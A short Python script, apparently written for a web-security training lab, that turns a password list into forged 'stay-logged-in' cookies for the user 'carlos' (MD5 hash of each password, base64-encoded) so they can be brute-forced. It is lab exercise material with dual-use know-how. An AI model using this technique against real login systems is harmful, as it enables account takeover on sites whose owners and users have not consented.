# Created by sm6r,2024
# Lab: Brute-forcing a stay-logged-in cookie
import hashlib
import base64

file = open("passwords.txt","r")
out = open("cookies.txt","a")

for line in file.readlines():
    line = line.strip()
    cookie= "carlos:" + hashlib.md5(line.encode()).hexdigest()
    cookie_base64 = base64.b64encode(cookie.encode())
    print(cookie_base64.decode(),file=out)
    

